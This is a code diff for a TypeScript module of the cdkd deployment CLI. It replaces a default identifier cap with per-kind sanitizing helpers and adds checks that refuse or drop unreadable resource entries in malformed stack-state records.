@@ -19,10 +19,12 @@ import { describeRegionValueKind, isReadableBag } from '../types/state.js';
 import type { StackState } from '../types/state.js';
 
 /**
- * The identifier cap every message here uses unless a caller says otherwise.
- * See {@link safeIdentifier} for why it is a parameter at all.
+ * The row name a READ-ONLY command reports for a record whose whole `resources`
+ * map is unreadable — `cdkd drift` as a `notCompared` outcome and `cdkd diff`
+ * as an unreadable row. Parenthesised so it cannot be mistaken for a logical
+ * id, which CloudFormation keeps alphanumeric.
  */
-const IDENT_CAP_DEFAULT = 128;
+export const UNREADABLE_RESOURCES_MAP_ROW = '(resources map)';
 
 /** The error code every malformed-record refusal carries, whatever its class. */
 export const STATE_RESOURCES_MALFORMED = 'STATE_RESOURCES_MALFORMED';
@@ -80,6 +82,18 @@ export function hasReadableOutputs(state: Pick<StackState, 'outputs'>): boolean 
 export { isReadableBag };
 
 /**
+ * The cap for a value whose grammar is SHORT — an AWS region, or the name of a
+ * state container. Unchanged from the literal this module used for every
+ * identifier before go-to-k/cdkd#3018 made the cap a parameter, so no message
+ * carrying either moves.
+ *
+ * A logical id does NOT share it: CloudFormation allows 255 characters there
+ * (`IDENT_MAX_CODE_POINTS`), and a legitimate 129-to-255-character CDK id cut at
+ * 128 renders as a name the record does not hold.
+ */
+const SHORT_NAME_MAX_CODE_POINTS = 128;
+
+/**
  * The shared explanation, in the terms the reader needs: what is wrong, what
  * to look at, and what NOT to do next.
  *
@@ -113,8 +127,21 @@ export { isReadableBag };
  * stays private. The pair here is not duplicated: what differs is the
  * `shellQuote` composition every message in THIS module needs and that one
  * must not have.
+ *
+ * The helper itself carries no `buildForceUnlockCommand`-style exactness gate,
+ * which SUPPRESSES a whole command when sanitizing changed the value. The
+ * difference is what the command DOES: `cdkd force-unlock` deletes another
+ * process's lock, so naming a stack that is not quite the record's is
+ * destructive and suppressing is right. The command most texts here end on is
+ * `cdkd state show`, which reads; emitting it with a sanitized name leads the
+ * reader either to "no state found for ..." or to a sibling record the name
+ * now matches, which a read shows them as healthy. Neither changes anything,
+ * where emitting NOTHING leaves a broken record with no next step at all. A
+ * text that points at a command which WRITES owns the gate at its own site:
+ * {@link malformedDestroyResourcesRefusalMessage} names no target unless both
+ * identifiers render exactly, and gives `cdkd state orphan` as a template.
  */
-function safeIdentifier(value: string, maxCodePoints = IDENT_CAP_DEFAULT): string {
+function safeIdentifier(value: string, maxCodePoints: number): string {
   // CAPPED as well as sanitized. A stack name can arrive from an S3 key, so a
   // planted multi-kilobyte one would push the trailing remedy command off the
   // reader's screen -- the message would be technically correct and useless.
@@ -122,26 +149,101 @@ function safeIdentifier(value: string, maxCodePoints = IDENT_CAP_DEFAULT): strin
   // surrogate pair; `displaySafe` rather than `displayIdent`, because the
   // latter JSON-quotes and that would compose badly with `shellQuote` below.
   //
-  // The cap is a PARAMETER because one caller's verdict turns on it:
-  // `malformedDestroyResourcesRefusalMessage` withholds its remedy unless the
-  // identity renders EXACTLY, and at 128 an ordinary multi-level CDK nested
-  // child (`<root>~<...NestedStackResource><hash>~<...>`, measured past 150
-  // code points) truncates -- so a HEALTHY record took the fallback arm. That
-  // site passes `STACK_REF_MAX_CODE_POINTS`, which is the grammar a cdkd
-  // state-record reference is legitimate up to and the same bound
-  // `isPasteableIdent` uses. Still bounded, so a planted multi-kilobyte name
-  // is truncated there too and lands in the withhold arm.
+  // The cap is a REQUIRED parameter, so no site can fall into a region-sized
+  // default. Most RECORD-DERIVED identifiers reach it through the per-kind
+  // helpers below; two builders pass a cap directly — cdkd's own container
+  // names take `SHORT_NAME_MAX_CODE_POINTS`, whose own doc carries the reason
+  // and whose names are not record-derived at all, and
+  // `divergentRecordRegionRefusalMessage` measures a key region at the
+  // state-record grammar's cap (go-to-k/cdkd#3328) rather than a region's, for
+  // the reason stated at that site. A stack name takes
+  // `STACK_REF_MAX_CODE_POINTS`, the grammar a cdkd state-record reference is
+  // legitimate up to and the same bound `isPasteableIdent` uses: at 128 an
+  // ordinary multi-level CDK nested child
+  // (`<root>~<...NestedStackResource><hash>~<...>`, measured past 150 code
+  // points) truncates, which named a stack that does not exist and made
+  // `malformedDestroyResourcesRefusalMessage`'s exactness verdict take its
+  // fallback arm on a HEALTHY record. Still bounded, so a planted
+  // multi-kilobyte name is truncated too.
   const safe = displaySafe(value, { asciiOnly: true });
   if (!safe) return UNRENDERABLE;
   const { text, truncated } = truncateCodePoints(safe, maxCodePoints);
   return truncated ? `${text}...` : text;
 }
 
+/*
+ * One named helper per identifier KIND, and no default cap on the shared body.
+ * The cap used to be a defaulted parameter, and the default was the region's:
+ * every stack-name site that forgot to pass the wider one — four of them, found
+ * across two review rounds and not all by the same reader — silently cut a
+ * legitimate `Parent~Child~...` name at 128 and emitted a remedy command naming
+ * a stack that does not exist. A named helper cannot be called with the wrong
+ * cap, and a new kind of RECORD-DERIVED identifier has to be added here rather
+ * than improvised at a site. (Container names are cdkd's own fixed literals, not
+ * record-derived, and take the short cap directly at their one site.)
+ */
+
+/**
+ * A stack name, which a nested chain makes legitimately long.
+ *
+ * Safe for a command that only READS. A caller building a command that WRITES
+ * owns an exactness gate as well — print the command only when this returns the
+ * value unchanged, since a name sanitizing altered can resolve to a different
+ * stack — whenever the identity can hold characters sanitizing alters: anything
+ * not already validated, whether a user typed it or the record supplied it.
+ * `reportDriftBaselineGaps` (`src/cli/commands/export.ts`) gates its
+ * `refresh-observed` command for that reason: `cdkd export --template` takes
+ * the stack name as a free-typed positional, and the record BODY is a second
+ * source when a caller omits the loaded identity. A synthesized stack name is
+ * not an exception by itself — a prebuilt cloud assembly's name is read
+ * unvalidated — which is why `dropRecordCommand` gates its substitution on
+ * {@link rendersExactly} (go-to-k/cdkd#3360, closed by go-to-k/cdkd#3363).
+ */
+export function safeStackName(value: string): string {
+  return safeIdentifier(value, STACK_REF_MAX_CODE_POINTS);
+}
+
+/** An AWS region. */
+export function safeRegion(value: string): string {
+  return safeIdentifier(value, SHORT_NAME_MAX_CODE_POINTS);
+}
+
+/**
+ * A CloudFormation logical id, as it appears in a LIST of ids — which is the
+ * only way this module and its callers print one.
+ *
+ * NOT {@link safeIdentifier}, although it is the obvious third sibling, and it
+ * used to be exactly that. `displaySafe` TRIMS, so a sanitize-then-quote pair
+ * renders a torn `resources["Bucket "]` byte-identically to a healthy sibling
+ * `Bucket`, and the message sends the reader to the intact record while the
+ * damaged one goes unnamed. `displayIdent` compares the sanitized text with the
+ * raw one and JSON-quotes whenever they differ, so a padded or rewritten id can
+ * never render bare. Past that, what it shows is judged on the text it KEEPS:
+ * a kept part holding a character outside the plain-identifier set (`'`, a
+ * space) is wrapped in double quotes with an embedded `"` escaped, so text an
+ * id plants on a line that ends in a pasteable command stays visibly inside one
+ * quoted token. A cut id is followed by `[cut: N more characters withheld]`,
+ * which cannot be read as part of it — so a plain 255-character prefix renders
+ * bare with that marker even when the withheld tail held a `'`, and nothing of
+ * the tail is shown. An id with nothing renderable left is the bare
+ * `<unrenderable>` stand-in. A
+ * bare `,` inside a plain id still reads as two entries in a `', '`-joined list
+ * — the residual go-to-k/cdkd#3179 records for every caller of the helper. That
+ * is the answer go-to-k/cdkd#3317 recorded for
+ * `namedPropertyBagsClause`; this is the same rule for the other lists, so two
+ * sibling clauses in one module cannot give opposite answers.
+ *
+ * Capped at `IDENT_MAX_CODE_POINTS`, a logical id's own limit, rather than a
+ * region-sized cut that would name no record.
+ */
+export function displayLogicalId(value: string): string {
+  return displayIdent(value, { maxCodePoints: IDENT_MAX_CODE_POINTS });
+}
+
 /**
  * The DIAGNOSIS sentence itself, with no identity and no remedy in it.
  *
- * ONE spelling, for the reason {@link malformedStateDetail} gives for existing
- * at all: two copies of a diagnosis are what drift. It is extracted because
+ * ONE spelling, because two copies of a diagnosis are what drift. It is extracted because
  * {@link malformedDestroyResourcesRefusalMessage} needs the same sentence
  * under an identity it does NOT trust, where the detail's substituted
  * `cdkd state show` command must not appear — a difference in the COMMAND, not
@@ -153,17 +255,22 @@ const MALFORMED_RESOURCES_DIAGNOSIS =
   `an unreadable one is indistinguishable from an empty stack, and acting on that reading ` +
   `would make a deploy re-CREATE every resource and a destroy delete none of them.`;
 
-function malformedStateDetail(
-  stackName: string,
-  region: string,
-  maxCodePoints = IDENT_CAP_DEFAULT
-): string {
-  const stack = safeIdentifier(stackName, maxCodePoints);
-  const reg = safeIdentifier(region, maxCodePoints);
+/**
+ * `region` is optional for ONE caller's sake: `cdkd export`'s baseline report,
+ * whose loaded region is absent when the record it loaded is a legacy
+ * region-less one and no synth region was available to stand in for it. A placeholder there would put a `--stack-region` into a
+ * command the reader pastes that selects no record at all — so an absent
+ * region drops the clause and the flag rather than inventing one.
+ */
+function malformedStateDetail(stackName: string, region: string | undefined): string {
+  const stack = safeStackName(stackName);
+  const where = region === undefined ? '' : ` (${shellQuote(safeRegion(region))})`;
+  const regionFlag =
+    region === undefined ? '' : ` --stack-region ${shellQuote(safeRegion(region))}`;
   return (
-    `State for ${shellQuote(stack)} (${shellQuote(reg)}) ${MALFORMED_RESOURCES_DIAGNOSIS} ` +
+    `State for ${shellQuote(stack)}${where} ${MALFORMED_RESOURCES_DIAGNOSIS} ` +
     `Inspect it with: ` +
-    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
+    `cdkd state show ${shellQuote(stack)}${regionFlag} --json`
   );
 }
 
@@ -337,15 +444,16 @@ export function malformedStateRefusalMessage(stackName: string, region: string):
  * because a LEGACY record has no key region at all, in which case the value
  * printed is the CLI's own and `--stack-region` must be omitted.
  *
- * **The cap this arm measures against is `STACK_REF_MAX_CODE_POINTS`, not the
- * 128 every other text in this module uses**, and it is threaded rather than
- * hard-coded because the VERDICT turns on it. At 128 an ordinary multi-level
- * CDK nested child (`<root>~<...NestedStackResource><hash>~<...>`, measured
- * past 150 code points) truncates, fails `exact`, and takes the withhold arm
- * on a HEALTHY record — which is fail-safe but makes the fallback the common
- * path for exactly the nested destroys this lane added a guard to (review
- * round 2 of go-to-k/cdkd#3332). The bound is still a bound: a planted
- * multi-kilobyte name is truncated at 1152 and lands in the withhold arm.
+ * **The VERDICT turns on the identifier caps**, which is why the stack name is
+ * measured through {@link safeStackName} (`STACK_REF_MAX_CODE_POINTS`) and the
+ * region through {@link safeRegion} (128, which no real region approaches). At
+ * 128 an ordinary multi-level CDK nested child
+ * (`<root>~<...NestedStackResource><hash>~<...>`, measured past 150 code
+ * points) truncates, fails `exact`, and takes the withhold arm on a HEALTHY
+ * record — which is fail-safe but makes the fallback the common path for
+ * exactly the nested destroys this lane added a guard to (review round 2 of
+ * go-to-k/cdkd#3332). The bound is still a bound: a planted multi-kilobyte name
+ * is truncated at 1152 and lands in the withhold arm.
  *
  * Identifiers are sanitized and THEN shell-quoted, for the reasons
  * {@link safeIdentifier}'s note gives.
@@ -355,12 +463,10 @@ export function malformedDestroyResourcesRefusalMessage(stackName: string, regio
   // or truncate, and each of those can render a planted identifier as a
   // healthy one. Compared against the RAW value, so any divergence at all
   // suppresses the target-naming half.
-  // The cap is the STATE-RECORD grammar, not the 128 every other text here
-  // uses: this arm's VERDICT turns on it, and at 128 an ordinary multi-level
-  // nested child truncates and a healthy record takes the withhold arm.
-  const cap = STACK_REF_MAX_CODE_POINTS;
-  const exact =
-    safeIdentifier(stackName, cap) === stackName && safeIdentifier(region, cap) === region;
+  // Through the per-kind helpers: this arm's VERDICT turns on the caps, and a
+  // stack name capped at a region's 128 would send an ordinary multi-level
+  // nested child down the withhold arm.
+  const exact = safeStackName(stackName) === stackName && safeRegion(region) === region;
   // The DIAGNOSIS half. On the exact arm it is the shared detail, whose
   // pasteable `cdkd state show` is sound because the identity renders
   // faithfully. On the withhold arm it must NOT be: a message that has just
@@ -370,7 +476,7 @@ export function malformedDestroyResourcesRefusalMessage(stackName: string, regio
   // before the destructive step. So that arm takes the module's own
   // no-identity form instead.
   const detail = exact
-    ? malformedStateDetail(stackName, region, cap)
+    ? malformedStateDetail(stackName, region)
     : `${stackClause(undefined, undefined)} ${MALFORMED_RESOURCES_DIAGNOSIS}`;
   const remedy = exact
     ? `To drop the record deliberately and leave the live resources standing, run ` +
@@ -755,9 +861,11 @@ export function malformedRenderedContainersWarning(
   region: string,
   containers: readonly RenderedStateContainer[]
 ): string {
-  const stack = safeIdentifier(stackName);
-  const reg = safeIdentifier(region);
-  const names = containers.map((name) => `'${safeIdentifier(name)}'`).join(', ');
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
+  const names = containers
+    .map((name) => `'${safeIdentifier(name, SHORT_NAME_MAX_CODE_POINTS)}'`)
+    .join(', ');
   return (
     `State for ${shellQuote(stack)} (${shellQuote(reg)}) has a non-object ${names} — the record ` +
     `is malformed or truncated. 'Object.entries' walks a string or a list as readily as a map, ` +
@@ -769,7 +877,7 @@ export function malformedRenderedContainersWarning(
 }
 
 /** The warning a caller of {@link repairMalformedResourcesForReadOnly} emits. */
-export function malformedResourcesWarning(stackName: string, region: string): string {
+export function malformedResourcesWarning(stackName: string, region: string | undefined): string {
   return `${malformedStateDetail(stackName, region)} Continuing with an EMPTY resource set: this command's output describes zero resources, which is not the same as the stack having none.`;
 }
 
@@ -848,8 +956,8 @@ export function repairMalformedOutputsForReadOnly(state: StackState): boolean {
  * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOutputsWarning(stackName: string, region: string): string {
-  const stack = safeIdentifier(stackName);
-  const reg = safeIdentifier(region);
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
   return (
     `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
     `record is malformed or truncated. Where the stored value is a string or a list, ` +
@@ -886,12 +994,14 @@ export function malformedOutputsWarning(stackName: string, region: string): stri
 export function refuseMalformedState(state: StackState, stackName: string, region: string): void {
   if (hasReadableResources(state)) return;
   // NOT `markNonRetryable`, and that is the DECISION rather than the omission
-  // it reads as: this is the only refusal in the module without the marker,
-  // because its callers — `cdkd import`, `cdkd orphan`, `cdkd rollback` — each
-  // raise it from the command's own top level, outside any `withRetry`. The
-  // marker would fence nothing there. Revisit if a retrying caller is added;
-  // `tests/unit/state/malformed-resources-bag.test.ts` names this exemption so
-  // a seventh refusal cannot join it silently (review round 2 of
+  // it reads as: its callers — `cdkd import`, `cdkd orphan`, `cdkd rollback`,
+  // `cdkd state refresh-observed` and `cdkd drift --accept` / `--revert` — each
+  // raise it from the command's own flow, outside any `withRetry`, so the
+  // marker would fence nothing there. {@link refuseMalformedResourceEntries}
+  // and {@link refuseMalformedResourcePropertiesForOrphan} are the other two
+  // unmarked refusals, for the same reason. Revisit if a retrying caller is
+  // added; `tests/unit/state/malformed-resources-bag.test.ts` names all three
+  // exemptions so another refusal cannot join them silently (review round 2 of
   // go-to-k/cdkd#3332).
   throw new CdkdError(malformedStateRefusalMessage(stackName, region), STATE_RESOURCES_MALFORMED);
 }
@@ -914,8 +1024,8 @@ export function refuseMalformedState(state: StackState, stackName: string, regio
  * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOutputsRefusalMessage(stackName: string, region: string): string {
-  const stack = safeIdentifier(stackName);
-  const reg = safeIdentifier(region);
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
   return (
     `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
     `record is malformed or truncated. This command can WRITE state, so it refuses rather than ` +
@@ -951,8 +1061,8 @@ export function malformedOutputsRefusalMessage(stackName: string, region: string
  * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedExportSourceWarning(stackName: string, region: string): string {
-  const stack = safeIdentifier(stackName);
-  const reg = safeIdentifier(region);
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
   return (
     `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map or ` +
     `'exportNames' list — the record is malformed or truncated. It contributes NO exports to ` +
@@ -990,8 +1100,8 @@ export function malformedExportSourceWarning(stackName: string, region: string):
  * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedExportNamesWarning(stackName: string, region: string): string {
-  const stack = safeIdentifier(stackName);
-  const reg = safeIdentifier(region);
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
   return (
     `State for ${shellQuote(stack)} (${shellQuote(reg)}) has an unusable 'exportNames' list — ` +
     `the record is malformed or truncated. It is read as an EMPTY export set, which is not the ` +
@@ -1076,8 +1186,8 @@ export function refuseMalformedOutputs(
  * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedDestroyOutputsRefusalMessage(stackName: string, region: string): string {
-  const stack = safeIdentifier(stackName);
-  const reg = safeIdentifier(region);
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
   return (
     `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
     `record is malformed or truncated. This command DELETES state, so it refuses rather than ` +
@@ -1145,8 +1255,8 @@ export function malformedNestedChildOutputsRefusalMessage(
   childStackName: string,
   region: string
 ): string {
-  const stack = safeIdentifier(childStackName);
-  const reg = safeIdentifier(region);
+  const stack = safeStackName(childStackName);
+  const reg = safeRegion(region);
   return (
     `State for nested stack child ${shellQuote(stack)} (${shellQuote(reg)}) has no readable ` +
     `'outputs' map — the record is malformed or truncated. The parent's 'Outputs.<Key>' ` +
@@ -1220,8 +1330,8 @@ export function refuseMalformedNestedChildOutputs(
  * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedLocalOutputsWarning(stackName: string, region: string): string {
-  const stack = safeIdentifier(stackName);
-  const reg = safeIdentifier(region);
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
   return (
     `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
     `record is malformed or truncated. 'Object.entries' walks a string or a list as readily as ` +
@@ -1265,8 +1375,8 @@ const NAMED_UNREADABLE_PROPERTY_BAGS = 5;
  */
 function stackClause(stackName: string | undefined, region: string | undefined): string {
   if (stackName === undefined) return 'The state record this command loaded';
-  const where = region === undefined ? '' : ` (${shellQuote(safeIdentifier(region))})`;
-  return `State for ${shellQuote(safeIdentifier(stackName))}${where}`;
+  const where = region === undefined ? '' : ` (${shellQuote(safeRegion(region))})`;
+  return `State for ${shellQuote(safeStackName(stackName))}${where}`;
 }
 
 /**
@@ -1364,8 +1474,9 @@ function dropRecordCommand(
 /**
  * Whether an identity survives {@link safeIdentifier} UNCHANGED at the
  * state-record grammar's cap, so a command or a key built from it addresses the
- * record the message is about. The cap is `STACK_REF_MAX_CODE_POINTS`, not the
- * 128 the prose uses: `cdkd orphan` reads a PREBUILT assembly's stack name
+ * record the message is about. The cap is `STACK_REF_MAX_CODE_POINTS` — the cap
+ * the prose also cuts a stack name at, never a region's 128 — because
+ * `cdkd orphan` reads a PREBUILT assembly's stack name
  * unvalidated, so a manifest can carry one past 128 that is nonetheless the
  * record's real key, and truncating it names nothing — the same bound
  * `malformedDestroyResourcesRefusalMessage` uses, reached from a different
@@ -1377,8 +1488,8 @@ function dropRecordCommand(
  * ({@link orphanInspectClause}) — so no two of them can disagree about a name
  * (go-to-k/cdkd#3363 review, M0 and M2). What it does NOT cover yet: the
  * destroy refusal and the divergent-region refusal above still spell the same
- * test inline, and the shared {@link inspectCommand} is ungated at 128 for its
- * other callers.
+ * test inline, and the shared {@link inspectCommand} is ungated for its other
+ * callers (it renders the stack at that same cap, the region at 128).
  */
 function rendersExactly(value: string): boolean {
   return safeIdentifier(value, STACK_REF_MAX_CODE_POINTS) === value;
@@ -1391,8 +1502,8 @@ function inspectCommand(stackName: string | undefined, region: string | undefine
     // here would be substituting the untrusted values the clause above drops.
     return `cdkd state show ${commandHole('stack')} --stack-region ${commandHole('region')} --json`;
   }
-  const flag = region === undefined ? '' : ` --stack-region ${shellQuote(safeIdentifier(region))}`;
-  return `cdkd state show ${shellQuote(safeIdentifier(stackName))}${flag} --json`;
+  const flag = region === undefined ? '' : ` --stack-region ${shellQuote(safeRegion(region))}`;
+  return `cdkd state show ${shellQuote(safeStackName(stackName))}${flag} --json`;
 }
 
 /**
@@ -1418,11 +1529,18 @@ function inspectCommand(stackName: string | undefined, region: string | undefine
  * it is one of the two shapes that used to die on a bare `TypeError` naming no
  * stack, no key and no remedy (`Cannot convert undefined or null to object`).
  *
- * An entry that is not a readable OBJECT is SKIPPED rather than named, so this
- * verdict is ORDER-INDEPENDENT with respect to the entry-level guard
- * go-to-k/cdkd#3226 adds: a `null` entry has no `properties` to test, and
- * reading one off a string entry would name a per-character defect that is
- * really the entry's. Likewise a `resources` bag that is not readable at all
+ * An entry that is not a readable OBJECT is SKIPPED rather than named: a `null`
+ * entry has no `properties` to test, and reading one off a string entry would
+ * name a per-character defect that is really the entry's. That makes this
+ * verdict independent of {@link unreadableResourceEntries} for every entry
+ * that is not an object — but NOT for an object with no `resourceType` whose
+ * `properties` map is also unreadable, which both predicates name. A read-only caller that takes both therefore drops
+ * entries FIRST ({@link repairMalformedResourceEntriesForReadOnly}), so the
+ * row is reported once, as unreadable, rather than warned about as a preview
+ * and then dropped. The object test stays here rather than
+ * {@link isReadableResourceEntry} because the deploy path takes this
+ * predicate WITHOUT the entry one, and narrowing it would let a typeless
+ * object with a torn map reach the comparison unrefused. Likewise a `resources` bag that is not readable at all
  * yields `[]` here rather than ids invented from a string's characters — that
  * class is {@link hasReadableResources}'s to report. What a caller must not do
  * is take only this one.
@@ -1545,9 +1663,8 @@ export function repairMalformedResourcePropertiesForReadOnly(state: StackState):
 /**
  * The half the refusal and the warning share: what is wrong and which records.
  *
- * ONE spelling rather than two, for the reason {@link malformedStateDetail}
- * exists beside its own pair — the two texts differ only in what happens NEXT,
- * and a second copy of the diagnosis is what drifts.
+ * ONE spelling rather than two, because the two texts differ only in what
+ * happens NEXT, and a second copy of the diagnosis is what drifts.
  *
  * The STACK and REGION go through {@link safeIdentifier} and are THEN
  * shell-quoted, for the reasons that helper's own note gives: each reaches this
@@ -1578,10 +1695,10 @@ export function repairMalformedResourcePropertiesForReadOnly(state: StackState):
  *    id ending `Prod...`.
  *
  * The cap is passed EXPLICITLY although it equals the default: a logical id is
- * valid up to `IDENT_MAX_CODE_POINTS`, and the point of not reusing
- * {@link safeIdentifier} here is that its 128 would truncate a legitimate long
- * id into one naming no record. Spelling the cap keeps that decision visible at
- * the site it was made for.
+ * valid up to `IDENT_MAX_CODE_POINTS` — the cap {@link displayLogicalId} also
+ * takes — and a region-sized cut would truncate a legitimate long id into one
+ * naming no record. Spelling the cap keeps that decision visible at the site it
+ * was made for.
  *
  * Known residual, NOT introduced here: `,` is in `PLAIN_IDENT`, so an id
  * carrying one still renders bare inside this `', '`-joined list and reads as
@@ -1750,7 +1867,8 @@ export function malformedResourcePropertiesRefusalMessage(
  *
  * `rawStackName` / `rawRegion` are the CALLER's resolved identity — the synthesized
  * stack name and the region `pickStackRegion` settled on, never the record's
- * own unvalidated self-report. See {@link stackClause}.
+ * own unvalidated self-report (though an assembly-supplied stack name is not
+ * validated either — go-to-k/cdkd#3360). See {@link stackClause}.
  */
 export function malformedOrphanResourcePropertiesRefusalMessage(
   rawStackName: string | undefined,
@@ -2126,7 +2244,7 @@ export function refuseMalformedResourcePropertiesForOrphan(
   // level — `rewriteResourceReferences` is called from nowhere else — so there
   // is no `withRetry` for the marker to fence. Named in
   // `tests/unit/state/malformed-resources-bag.test.ts`'s UNMARKED table beside
-  // its sibling, so a NINTH refusal still cannot join them silently.
+  // its siblings, so another refusal still cannot join them silently.
   throw new CdkdError(
     malformedOrphanResourcePropertiesRefusalMessage(stackName, region, unreadable, recovery),
     STATE_RESOURCES_MALFORMED
@@ -2182,4 +2300,277 @@ export function malformedResourcePropertiesWarning(
  */
 export function producerRecordKey(stackName: string, region: string): string {
   return JSON.stringify([stackName, region]);
+}
+
+/**
+ * How many unreadable logical ids the refusal below names before summarizing.
+ *
+ * Five rather than the ten the `cdkd export` baseline report uses: this text
+ * already carries the remedy command, and that command has to stay on the
+ * reader's screen (the reason {@link safeIdentifier} caps a name at all).
+ */
+const NAMED_UNREADABLE_ENTRIES = 5;
+
+/**
+ * The logical ids of every `resources` ENTRY that is not a readable object.
+ *
+ * A DIFFERENT shape from the unreadable BAG the rest of this module is about,
+ * and one {@link hasReadableResources} says nothing about: it tests the bag, so
+ * `{"resources": {"R": null}}` passes it and the `null` surfaces one
+ * dereference later (issue go-to-k/cdkd#3018 items 1 and 2). Returns `[]` for an
+ * unreadable BAG rather than inventing ids from it — a string bag would
+ * otherwise yield one "id" per character. That makes the two refusals
+ * ORDER-INDEPENDENT rather than ordered: whichever runs first, an unreadable
+ * bag leaves this one silent and is caught by {@link refuseMalformedState}.
+ * What a caller must not do is take only this one.
+ */
+export function unreadableResourceEntries(state: StackState): readonly string[] {
+  if (!hasReadableResources(state)) return [];
+  return Object.entries(state.resources)
+    .filter(([, entry]) => !isReadableResourceEntry(entry))
+    .map(([logicalId]) => logicalId);
+}
+
+/**
+ * Can this ENTRY be read as a resource record at all?
+ *
+ * Object-ness is NOT the whole question, and taking {@link isReadableBag} for
+ * the answer left a shape crashing one line past the guard: `{"R": {}}` is an
+ * object, so it passed, and then `resource.resourceType.startsWith(...)` threw
+ * — the same bare `TypeError` the `null` entry beside it no longer produces.
+ * `resourceType` is the one field every reader of an entry touches before any
+ * other (the Custom-Resource routing, the provider lookup, the skip list), so
+ * it is the field that decides whether the row can be read at all.
+ *
+ * Deliberately NOT a widening of {@link isReadableBag}. That predicate answers
+ * a question about CONTAINERS — the bag, and the four rendered containers
+ * go-to-k/cdkd#3187 added — and a resource-shaped test there would refuse an
+ * `outputs` map for having no `resourceType`.
+ *
+ * It stops at `resourceType` rather than checking `physicalId` or `properties`
+ * too, and the message this feeds says only what it checks: a row with a type
+ * but no physical id IS readable here, fails per-resource where it is used, and
+ * is reported by that command in its own terms.
+ */
+export function isReadableResourceEntry(entry: unknown): boolean {
+  return (
+    isReadableBag(entry) && typeof (entry as { resourceType?: unknown }).resourceType === 'string'
+  );
+}
+
+/**
+ * For a command that READS each resource record and WRITES the bag back: refuse
+ * the record naming the entries it could not read.
+ *
+ * **Deliberately NOT folded into {@link refuseMalformedState}**, and the reason
+ * is behavioural rather than tidiness: folding it would decide, for every one of
+ * that function's callers at once, that ANY unreadable row blocks the whole
+ * command — a call none of them has made. `cdkd rollback` is the counter-example
+ * that settles it: its executor reaches a record by logical id and treats a
+ * falsy one as `skip-already-done`, so an unrelated broken row costs it nothing
+ * and refusing would stop the command documented as the way to UNWIND a stack
+ * whose state is already suspect. The other callers (`cdkd import`,
+ * `cdkd orphan`, `cdkd scrub`) each owe their own classification; `cdkd orphan`
+ * does still throw on an unreadable sibling, which is why that one is tracked on
+ * go-to-k/cdkd#3202 rather than answered here by a shared refusal.
+ *
+ * So the entry rule is OPT-IN, taken by a flow that dereferences EVERY entry and
+ * writes the record back.
+ *
+ * REFUSE rather than skip, at both sites that take it — `cdkd state
+ * refresh-observed`, and `cdkd drift` under `--accept` / `--revert` — because
+ * each is a WRITER. Skipping would report a clean run (`N refreshed, M
+ * unsupported`; `N resources checked`) with the corrupt entries invisible and
+ * then save the record back, so the ONE thing the user could have acted on
+ * would be the thing the run did not say. Naming them costs nothing a skip
+ * would have preserved either: both refusals happen before this stack's lock
+ * and before any AWS read of it, so no partial work on it is thrown away.
+ *
+ * PER STACK, which is why the message says so — and the callers reach a
+ * multi-stack refusal differently. `cdkd state refresh-observed` checks every
+ * target's shape before it saves any, so a record ALREADY malformed stops the
+ * run before a write; only one edited between that check and its own refresh
+ * reaches this call after the stacks ahead of it were saved. `cdkd drift --all`
+ * collects every stack's report before either writer runs. The message cannot
+ * tell which case it is in, so it claims only what holds for both.
+ *
+ * That is not an argument that a skip is always wrong — the read-only twin
+ * {@link repairMalformedResourceEntriesForReadOnly} does exactly that, for
+ * plain `cdkd drift` and `cdkd diff`, and warns. What makes the difference is
+ * the WRITE, not the shape.
+ *
+ * Unlike {@link repairMalformedResourcesForReadOnly} this never mutates: the
+ * entries stay exactly as stored, which is what keeps the record's own evidence
+ * intact for whoever inspects it next.
+ */
+export function refuseMalformedResourceEntries(
+  state: StackState,
+  stackName: string,
+  region: string
+): void {
+  const unreadable = unreadableResourceEntries(state);
+  if (unreadable.length === 0) return;
+  throw new CdkdError(
+    malformedResourceEntriesRefusalMessage(stackName, region, unreadable),
+    STATE_RESOURCES_MALFORMED
+  );
+}
+
+/**
+ * For a READ-ONLY command: drop every entry {@link unreadableResourceEntries}
+ * names, so the command can report on the rest, and return what it dropped so
+ * the caller can warn.
+ *
+ * The entry-level twin of {@link repairMalformedResourcesForReadOnly}, and it
+ * makes the same trade for the same reason: a command that cannot WRITE cannot
+ * launder anything, and reporting on the readable resources beats aborting on
+ * the first unreadable one. It is a DROP rather than a repair-to-`{}` because
+ * there is no empty `ResourceState` that would be honest — a record with no
+ * `resourceType` and no `physicalId` names no AWS resource — so the entry leaves
+ * the working copy entirely and the caller says so.
+ *
+ * Call it AFTER {@link repairMalformedResourcesForReadOnly}: an unreadable BAG
+ * has no entries to drop, and {@link unreadableResourceEntries} deliberately
+ * returns `[]` for one rather than inventing ids from a string's characters.
+ *
+ * Mutates the in-memory record only. Every caller today renders from the
+ * command's own derived output rather than echoing the record back, so the drop
+ * is visible as missing ROWS — which is exactly what the warning describes.
+ */
+export function repairMalformedResourceEntriesForReadOnly(state: StackState): readonly string[] {
+  const unreadable = unreadableResourceEntries(state);
+  for (const logicalId of unreadable) {
+    delete state.resources[logicalId];
+  }
+  return unreadable;
+}
+
